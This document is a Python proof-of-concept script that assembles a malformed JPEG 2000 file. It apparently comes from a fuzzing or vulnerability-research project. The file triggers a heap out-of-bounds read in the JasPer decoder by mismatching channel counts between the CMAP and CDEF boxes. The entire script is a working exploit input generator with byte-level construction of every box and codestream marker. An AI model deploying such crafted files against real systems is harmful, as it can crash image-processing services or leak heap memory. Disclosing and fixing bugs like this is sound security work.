#!/usr/bin/env python3
"""
vuln_001_gen.py — Generate a malicious JP2 file to trigger VULN 001.

Root cause: jp2_dec.c lines 402-413 loop dec->numchans (from CMAP) times
while indexing dec->cdef->data.cdef.ents[i] (allocated from CDEF numchans).
When CMAP numchans (3) > CDEF numchans (1), reads beyond the CDEF buffer.
"""

import struct
import os

OUTPUT_DIR = '/data/ylwang/non-textfuzz/target/_poc/jasper/src_appl_jasper_c'
OUTPUT_FILE = os.path.join(OUTPUT_DIR, 'vuln_001.jp2')


def make_box(type_tag: bytes, data: bytes) -> bytes:
    """Build a JP2 box: [4B BE length][4B type][data].
    Length includes the 8-byte header."""
    assert len(type_tag) == 4
    length = 8 + len(data)
    return struct.pack('>I', length) + type_tag + data


# ── 1. JP2 Signature box ─────────────────────────────────────────────────────
sig_box = make_box(b'jP  ', b'\x0D\x0A\x87\x0A')   # len=12

# ── 2. File Type box ─────────────────────────────────────────────────────────
ftyp_data = b'jp2 ' + struct.pack('>I', 0) + b'jp2 '   # brand + minor + compat
ftyp_box = make_box(b'ftyp', ftyp_data)                 # len=20

# ── 3. JP2 Header superbox contents ──────────────────────────────────────────

# ihdr: height=1, width=1, ncomp=3 (matches CMAP channels), bpc=7(8-bit unsigned)
#   c=7 (JP2_IHDR_COMPTYPE), unk=0, ip=0
ihdr_data  = struct.pack('>II', 1, 1)        # height, width
ihdr_data += struct.pack('>H', 3)            # ncomp=3
ihdr_data += bytes([7, 7, 0, 0])             # bpc, c, unk, ip
ihdr_box = make_box(b'ihdr', ihdr_data)      # len=22

# bpcc: 3 components, each 8-bit unsigned (bpc=7)
bpcc_box = make_box(b'bpcc', bytes([7, 7, 7]))  # len=11

# colr: meth=1 (enumerated), EnumCS=16 (sRGB)
colr_data = struct.pack('>BBB', 1, 0, 0) + struct.pack('>I', 16)
colr_box = make_box(b'colr', colr_data)     # len=15

# pclr: NE=4 entries, NPC=1 channel, Btyp[0]=7 (8-bit unsigned)
#   LUT values (1 byte each since Btyp=7 → 8 bits): 0x00, 0x40, 0x80, 0xFF
pclr_data  = struct.pack('>H', 4)           # NE=4
pclr_data += bytes([1])                     # NPC=1
pclr_data += bytes([7])                     # Btyp[0]=7
pclr_data += bytes([0x00, 0x40, 0x80, 0xFF])  # LUT data (4 entries × 1 channel × 1 byte)
pclr_box = make_box(b'pclr', pclr_data)    # len=16

# cmap: 3 entries, all palette-mapped (mtyp=1, JP2_CMAP_PALETTE)
#   Each entry: cmptno(2B BE) + mtyp(1B) + pcol(1B)
#   cmp=0 (image component), mtyp=1 (palette), pcol=0 (first palette column)
cmap_data = b''
for _ in range(3):
    cmap_data += struct.pack('>H', 0) + bytes([1, 0])  # cmptno=0, mtyp=1, pcol=0
cmap_box = make_box(b'cmap', cmap_data)    # len=20

# cdef: ONLY 1 entry — mismatches CMAP's 3 channels (triggers VULN 001)
#   Each entry: cn(2B BE), typ(2B BE), asoc(2B BE)
cdef_data  = struct.pack('>H', 1)          # N=1 (only 1 channel defined)
cdef_data += struct.pack('>HHH', 0, 0, 1)  # cn=0, typ=0 (color), asoc=1
cdef_box = make_box(b'cdef', cdef_data)    # len=16

# Assemble jp2h superbox (pclr BEFORE cmap, cdef AFTER cmap)
jp2h_content = ihdr_box + bpcc_box + colr_box + pclr_box + cmap_box + cdef_box
jp2h_box = make_box(b'jp2h', jp2h_content)  # len=108

# ── 4. Minimal JPEG-2000 codestream ──────────────────────────────────────────
# SOC marker
soc = b'\xFF\x4F'

# SIZ segment: Lsiz=41
siz  = b'\xFF\x51'
siz += struct.pack('>HH', 41, 0)                         # Lsiz=41, Rsiz=0
siz += struct.pack('>IIIIIIII', 1, 1, 0, 0, 1, 1, 0, 0) # Xsiz..YTOsiz
siz += struct.pack('>H', 1)                              # Csiz=1
siz += bytes([7, 1, 1])                                  # Ssiz[0]=7, XRsiz[0]=1, YRsiz[0]=1

# COD segment: Lcod=12 (2+1+4+5)
# SGcod: prog=0(LRCP), layers=1, MCT=0
# SPcod: ndl=0 (no decomp, single LL band), xcb=4, ycb=4, cbs=0, wavelet=1 (5/3 lossless)
# Using ndl=0 minimises required quantization entries and avoids DWT complexity
cod  = b'\xFF\x52'
cod += struct.pack('>HB', 12, 0)               # Lcod=12, Scod=0
cod += bytes([0x00, 0x00, 0x01, 0x00])          # SGcod: prog=0, layers=1, MCT=0
cod += bytes([0x00, 0x04, 0x04, 0x00, 0x01])    # SPcod: ndl=0, xcb=4, ycb=4, cbs=0, wavelet=1

# QCD segment: REQUIRED by jpc_dec_cp_isvalid() — without it, SOD processing fails.
# With JPC_QCX_NOQNT (no quantization, lossless) and ndl=0 (numrlvls=1):
#   numstepsizes = Lqcd - 2 - 1 = 1  (need >= 3*numrlvls-2 = 1)
# Each step size byte: stepsizes[i] = (byte >> 3) << 11; use 0x20 → exp=4
qcd  = b'\xFF\x5C'
qcd += struct.pack('>H', 4)          # Lqcd = 4 (2+1+1)
qcd += bytes([0x00])                  # Sqcd = 0x00 (NOQNT, numguard=0)
qcd += bytes([0x20])                  # step size byte: exponent = 4 (0x20 >> 3 = 4)

# SOT segment: Psot = SOT marker(2) + SOT segment(10) + SOD marker(2) = 14
# (Psot measured from first byte of SOT marker; no tile data after SOD so
#  EOC immediately follows SOD — jpc_dec_decodepkts returns 0 on seeing EOC)
sot  = b'\xFF\x90'
sot += struct.pack('>H', 10)   # Lsot=10
sot += struct.pack('>H', 0)    # Isot=0
sot += struct.pack('>I', 14)   # Psot=14 (SOT 12 bytes + SOD 2 bytes, no tile data)
sot += bytes([0, 1])            # TPsot=0, TNsot=1

# SOD marker — no tile data bytes; EOC follows immediately
sod       = b'\xFF\x93'
tile_data = b''                  # empty: jpc_dec_decodepkts sees EOC and exits cleanly

# EOC marker
eoc = b'\xFF\xD9'

codestream = soc + siz + cod + qcd + sot + sod + tile_data + eoc

jp2c_box = make_box(b'jp2c', codestream)

# ── 5. Assemble final JP2 file ────────────────────────────────────────────────
jp2_bytes = sig_box + ftyp_box + jp2h_box + jp2c_box

os.makedirs(OUTPUT_DIR, exist_ok=True)
with open(OUTPUT_FILE, 'wb') as f:
    f.write(jp2_bytes)

print(f"[+] Written {len(jp2_bytes)} bytes to {OUTPUT_FILE}")
print(f"    CMAP numchans: 3  (dec->numchans = 3)")
print(f"    CDEF numchans: 1  (ents[] has 1 entry)")
print(f"    Loop at jp2_dec.c:403 reads ents[1] and ents[2] => heap OOB read")
